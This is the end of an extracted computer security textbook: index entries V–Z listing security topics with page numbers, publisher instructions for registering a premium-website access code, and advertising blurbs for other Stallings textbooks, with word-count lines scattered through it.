Verification, 55, 61, 73, 98, 103, 142, 146, 452, 458, ­477–​­478,
[Word Count: 23]

­548–​­550, 570, 717
step, 73
Verifier, 75
View, relational databases, 162
Virtualization security, ­432–​­436
[Word Count: 14]

hosted virtualized systems, 436
hypervisor security, ­435–​­436
issues, ­434–​­435
virtualized infrastructure security, 436
Virtualized infrastructure security, 436
Virtualized rootkits, 229
Virtual machine monitor (VMM), 433
Virtual memory, 449
Virtual private networks (VPNs), 319, 739
Viruses, 22, 201
[Word Count: 37]

in Adobe’s PDF documents, 210
boot sector infector, 208
classification by concealment strategy, ­208–​­209
classification by target, 208
compression, 207
[Word Count: 20]

encrypted, 208
file infector, 208
infection mechanism, 205
logic, example, 206
macro, 206, ­209–​­210
metamorphic, 209
multipartite, 208
nature of, ­204–​­208
phases of growth, ­205–​­206
polymorphic, ­208–​­209
­real-​­world damage, 222
scripting, ­209–​­210
Stealth, 208
trigger mechanism, 205
Virus signature scanner, 232
Visual identity verification, 551
Voice over IP (VoIP) telephony, 252
Volatile memory, 469
VT100, 409
Vulnerabilities, 341, 344, 357, 368, 499, 569. See also Viruses;
[Word Count: 66]

Worms
identification, ­500–​­501
of passwords, ­78–​­80
PHP file inclusion, 386
PHP remote code injection, 386
shell scripts, 398
of software, 202
in stack buffer overflow, ­349–​­351
of system, ­17–​­18, 32
XSS reflection, ­387​­
[Word Count: 33]

4-way handshake, 756
Warezov family of worms, 215
War Games, 226
­Watering-​­hole attacks, 217
Weak collision resistant, 53
­Web-​­based ­e-​­commerce sites, 78
Web CGI injection attack, ­382–​­383
Web clients, 215
Web security, 190
Web servers, 215
Web server software, 31
­Well-​­formed transactions, 452
WHERE clause, 167
Wide area network (WAN), 285, 305, 317, 319. See also IEEE
[Word Count: 57]

802.11 Wireless LAN; IEEE 802.11i Wireless LAN
­Wi-​­Fi, 546, ­732–​­733, 737
­Wi-​­Fi5, 740
­Wi-​­Fi Alliance, 740, 746
­Wi-​­Fi Protected Access (WPA), 746
Windowing, 604
Windows, 83, 109, 157, 183, ­214–​­216, 221, 229, 243, 251, 262,
[Word Count: 35]

­278–​­281, 306, 314, 316, 352, ­360–​­361, ­363–​­364, 382, 389, 
391, 397, 400, 423, 440, 606, 735
Windows Event Log, ­589–​­591
Windows security
[Word Count: 22]

access controls, 431
application and service configuration, ­431–​­432
firewall and malware countermeasure capabilities, 432
patch management, 430
Security Account Manager (SAM), 431
[Word Count: 22]

Security ID (SID), 431
testing, 432
User Account Control (UAC), 431
users administration, 431
Windows shares, ­214–​­215
Wired Equivalent Privacy (WEP), 653, 655, 746, 750, 755, 758
Wireless access point (AP), 284
Wireless IDS (WIDS), 284
Wireless LAN, 653, 655. See also IEEE 802.11 Wireless LAN;
[Word Count: 46]

IEEE 802.11i Wireless LAN
Wireless networks
[Word Count: 6]

security measures, ­734–​­735
security risk of, ­732–​­733
threats to, ­733–​­734
Wireless network sensor, 284
Workstation hijacking, 79
World, 117
World Intellectual Property Organization (WIPO) treaties, 618
Worms, 201, 288
[Word Count: 29]

X.509 certificates, 62
X.509 ­ITU-​­T standard, ­722–​­725
XSS attacks, ­387–​­388, ­409–​­410
XSS reflection vulnerability, ­387​­
[Word Count: 15]

Zero-day attacks, 275, ­280–​­281
­Zero-​­day exploit, 216
Zeus banking Trojan, 225
Zeus crimeware toolkit, 202
Zombies, ­201–​­202, ­220–​­222, ­250–​­251, 258, 262
[Word Count: 21]

Thank you for purchasing a new copy of Computer Security: Principles and 
Practice, Third Edition. Your textbook includes twelve months of prepaid access to 
the book’s Premium Website. This prepaid subscription provides you with full access 
to the following student support areas:
[Word Count: 42]

• Online Chapters 
• Online Appendices 
• Practice Problem Set with Solutions
[Word Count: 12]

Use a coin to scratch off the coating and reveal your student access code. 
Do not use a knife or other sharp object as it may damage the code.
[Word Count: 29]

To access the Computer Security: Principles and Practice, Third Edition, Premium 
Website for the first time, you will need to register online using a computer with an 
Internet connection and a web browser. The process takes just a couple of minutes 
and only needs to be completed once.
[Word Count: 48]

1. Go to http://www.pearsonhighered.com/stallings/
2. Click on Premium Website.
3. Click on the Register button.
4. On the registration page, enter your student access code* found beneath the scratch-
off panel. Do not type the dashes. You can use lower- or uppercase.
5. Follow the on-screen instructions. If you need help at any time during the online 
registration process, simply click the Need Help? icon.
6. Once your personal Login Name and Password are confirmed, you can begin using 
the Computer Security: Principles and Practice Premium Website!
[Word Count: 87]

You only need to register for this Premium Website once. After that, you can log in any 
time at http://www.pearsonhighered.com/stallings/ by providing your Login Name 
and Password when prompted.
[Word Count: 29]

*Important: The access code can only be used once. This subscription is valid for 
twelve months upon activation and is not transferable. If this access code has already 
been revealed, it may no longer be valid. If this is the case, you can purchase a 
subscription by going to http://www.pearsonhighered.com/stallings/ and following 
the on-screen instructions.
[Word Count: 55]

DATA AND COMPUTER COMMUNICATIONS, TENTH EDITION
A comprehensive survey that has become the standard in the field, covering (1) data 
communications, including transmission, media, signal encoding, link control, and 
multiplexing; (2) communication networks, including circuit- and packet-switched, 
frame relay, ATM, and LANs; (3) the TCP/IP protocol suite, including IPv6, TCP, 
MIME, and HTTP, as well as a detailed treatment of network security. Received the 
2014 Text and Academic Authors Association (TAA) award for the best Computer 
Science and Engineering Textbook of the year.
[Word Count: 83]

COMPUTER ORGANIZATION AND ARCHITECTURE, 
NINTH EDITION
A unified view of this broad field. Covers fundamentals such as CPU, control unit, 
microprogramming, instruction set, I/O, and memory. Also covers advanced topics 
such as multicore, superscalar, and parallel organization. Five-time winner of the 
TAA award for the best Computer Science and Engineering Textbook of the year.
[Word Count: 54]

BUSINESS DATA COMMUNICATIONS, 
SEVENTH EDITION (WITH TOM CASE)
A comprehensive presentation of data communications and telecommunications 
from a business perspective. Covers voice, data, image, and video communications 
and applications technology and includes a number of case studies. Topics covered 
include data communications, TCP/IP, cloud computing, Internet protocols and 
applications, LANs and WANs, network security, and network management.
[Word Count: 57]

OPERATING SYSTEMS, EIGHTH EDITION
A state-of-the art survey of operating system principles. Covers fundamental 
technology as well as contemporary design issues, such as threads, SMPs, multicore, 
real-time systems, multiprocessor scheduling, embedded OSs, distributed systems, 
clusters, security, and object-oriented design. Third, fourth and sixth editions 
received the TAA award for the best Computer Science and Engineering Textbook 
of the year.
[Word Count: 59]

SIXTH EDITION
A tutorial and survey on network security technology. Each of the basic building 
blocks of network security, including conventional and public-key cryptography, 
authentication, and digital signatures, are covered. Provides a thorough mathemati-
cal background for such algorithms as AES and RSA. The book covers important 
network security tools and applications, including S/MIME, IP Security, Kerberos, 
SSL/TLS, network access control, and Wi-Fi security. In addition, methods for coun-
tering hackers and viruses are explored. Second edition received the TAA award for 
the best Computer Science and Engineering Textbook of 1999.
[Word Count: 91]

NETWORK SECURITY ESSENTIALS, FIFTH EDITION
A tutorial and survey on network security technology. The book covers important 
network security tools and applications, including S/MIME, IP Security, Kerberos, 
SSL/TLS, network access control, and Wi-Fi security. In addition, methods for coun-
tering hackers and viruses are explored.
[Word Count: 45]

SECOND EDITION
A comprehensive, state-of-the art survey. Covers fundamental wireless communica-
tions topics, including antennas and propagation, signal encoding techniques, spread 
spectrum, and error correction techniques. Examines satellite, cellular, wireless local 
loop networks and wireless LANs, including Bluetooth and 802.11. Covers Mobile 
IP and WAP.
[Word Count: 45]

HIGH-SPEED NETWORKS AND INTERNETS, SECOND EDITION
A state-of-the art survey of high-speed networks. Topics covered include TCP 
congestion control, ATM traffic management, Internet traffic management, 
differentiated and integrated services, Internet routing protocols and multicast rout-
ing protocols, resource reservation and RSVP, and lossless and lossy compression. 
Examines important topic of self-similar data traffic.
[Word Count: 53]

PROTOCOLS AND TECHNOLOGY
An up-to-date survey of developments in the area of Internet-based protocols and 
algorithms. Using a top-down approach, this book covers applications, transport 
layer, Internet QoS, Internet routing, data link layer and computer networks, secu-
rity, and network management.
[Word Count: 41]

Total Paragraphs: 6925